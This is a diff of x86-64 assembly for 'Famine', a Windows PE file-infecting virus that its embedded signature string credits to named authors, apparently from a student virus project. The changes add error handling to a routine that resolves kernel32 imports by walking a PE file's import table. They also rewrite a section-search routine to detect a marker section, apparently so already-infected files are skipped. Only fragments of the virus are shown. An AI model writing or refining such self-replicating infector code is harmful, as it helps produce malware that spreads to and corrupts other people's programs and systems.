@@ -115,7 +115,6 @@ stop:
 main endp
 fin_main:
 
-
 MUST_EXIT db 1
 ENTRY_POINT byte 0deh, 0adh, 0beh, 0efh, 0deh, 0adh, 0beh, 0efh
 SIGNATURE db 'Famine version 1.0 (c)oded by magouin-jcamhi',0ah,0h
@@ -214,8 +213,6 @@ not_nt_read_file:
 end_read_file:
 
 
-	
-
 	test rax, rax
 	je ret_failure
 
@@ -225,6 +222,9 @@ end_read_file:
 	mov rcx, qword ptr [rsp + 40]
 	mov rdx, r13
 	call init_imports ; On fait les imports
+
+	cmp rax, -1
+	je ret_failure
 
 	mov rax, qword ptr [rsp + 40]
 	add rax, 3Ch
@@ -806,13 +806,12 @@ GetModuleFileNameA_NAME		db 75h, 02h, 'GetModuleFileNameA',0h
 
 COUNT db 17, 16, 11, 14, 14, 17, 12, 17, 12, 21, 00
 
-init_imports proc ; void init_imports(void *fichier, int taille_du_ficher)
+init_imports proc ; void init_imports(void *fichier)
 	push rbp
 	mov rbp, rsp
 	sub rsp, 88
 
-	mov qword ptr [rsp + 32], rcx
-	mov qword ptr [rsp + 40], rdx ; on sauvegarde les parametres
+	mov qword ptr [rsp + 32], rcx ; on sauvegarde les parametres
 	
 
 	mov rax, rcx
@@ -827,9 +826,14 @@ init_imports proc ; void init_imports(void *fichier, int taille_du_ficher)
 	mov [rsp + 48], rax
 
 	mov rcx, rax
-	mov rdx, qword ptr [rsp + 40]
 	call search_section
 
+	cmp rdx, 0
+	jne apres
+	mov rax, -1
+	jmp fin_error
+
+apres:
 	mov [rsp + 56], rdx
 	mov [rsp + 64], rcx
 	
@@ -847,6 +851,12 @@ debut_boucle_init_imports_find_kernel32:
 	add rax, 0ch ; on va sur le champ Name
 	mov [rsp + 48], rax
 
+	cmp dword ptr [rax], 0
+	jne is_ok
+	mov rax, -1
+	jmp fin_error
+
+is_ok:
 	xor rbx, rbx
 	mov ebx, dword ptr [rax]
 	sub rbx, qword ptr [rsp + 64]
@@ -854,6 +864,7 @@ debut_boucle_init_imports_find_kernel32:
 	add rbx, qword ptr [rsp + 32] ; on transforme la rva en file offset puis on ajoute l'adresse memoire
 	lea rcx, KERNEL_32_DLL_NAME
 	mov rdx, rbx
+	
 	call ft_strequ
 	cmp rax, 1
 	je fin_boucle_init_imports_find_kernel32
@@ -957,6 +968,7 @@ fin_boucle_remplir_la_ft:
 	sub rax, qword ptr [rsp + 32] ; on transforme la rva en file offset puis on ajoute l'adresse memoire
 	mov rdi, rax
 
+fin_error:
 
 	mov rsp, rbp
 	pop rbp
@@ -964,13 +976,31 @@ fin_boucle_remplir_la_ft:
 
 init_imports endp
 
+
+; rbp
+
+; 16 - 24 -> nombre de sections
+; 08 - 16 -> return rcx
+; 00 - 08 -> return rdx
+
+; rsp
+
 search_section proc
 	push rbp
 	push rbx
+	push r15
 	mov rbp, rsp
+	sub rsp, 16
 	xor rbx, rbx
 
-	add	rcx, 8ch
+	mov dword ptr [rsp], 0
+	mov dword ptr [rsp + 8], 0
+	
+	add rcx, 2
+	mov bx, word ptr [rcx]
+	mov word ptr [rsp + 16], bx
+
+	add	rcx, 8ah
 	xor rbx, rbx
 	mov ebx, dword ptr [rcx]
 
@@ -984,19 +1014,44 @@ search_section proc
 
 debut_boucle:
 	mov edx, dword ptr [rax + 8]
-	mov ecx, dword ptr [rax + 12] ; exz = VirtualAddress = debut section
+	mov ecx, dword ptr [rax + 12] ; ecx = VirtualAddress = debut section
 	add edx, ecx; edx = VIrtualAddress + VirtualSize = fin section
+
+	mov r15, qword ptr [SECTION_NAME]
+	cmp qword ptr [rax], r15
+	jne cpaca
+	mov dword ptr [rsp], 0
+	mov dword ptr [rsp + 8], 0
+	jmp ret_func
+
+
+cpaca:
 	cmp ebx, ecx
 	jl fin_boucle
 	cmp ebx, edx
 	jg fin_boucle
+
+	mov dword ptr [rsp + 8], ecx
 	mov edx, dword ptr [rax + 20]
-	jmp ret_func
+	mov dword ptr [rsp], edx
+;	jmp ret_func
 fin_boucle:
 	add rax, 28h
+
+	mov r15w, word ptr [rsp + 16]
+	dec r15w
+	cmp r15w, 0
+	je ret_func
+	mov word ptr [rsp + 16], r15w
+
 	jmp debut_boucle 
+
 ret_func:
+	mov ecx, dword ptr [rsp + 8]
+	mov edx, dword ptr [rsp]
+
 	mov rsp, rbp
+	pop r15
 	pop rbx
 	pop rbp
 	ret
